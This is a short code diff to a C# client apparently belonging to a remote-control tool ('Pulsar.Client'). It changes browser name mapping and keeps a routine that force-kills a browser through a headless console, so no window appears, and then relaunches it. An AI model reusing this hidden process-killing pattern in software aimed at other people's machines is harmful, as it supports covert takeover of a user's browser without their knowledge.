@@ -312,17 +312,13 @@ namespace Pulsar.Client.Messages
 
             if (dontCloneProfile && browserPaths.TryGetValue(name, out string executablePath) && File.Exists(executablePath))
             {
-                string browserProcess = name.ToLower().Replace("mozilla", "firefox");
+                string browserProcess = name.ToLower().Replace("mozilla", "firefox").Replace("edge", "msedge").Replace("operagx", "opera");
                 string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {browserProcess}.exe /F";
+                Debug.WriteLine(killCommand);
                 ProcessHandler.CreateProc(killCommand);
                 Thread.Sleep(1000);
                 
                 Debug.WriteLine($"Direct starting browser: {executablePath}");
-
-                if (name == "Edge")
-                {
-                    executablePath = "conhost --headless cmd.exe /c start msedge";
-                }
 
                 ProcessHandler.CreateProc(executablePath);
                 return;
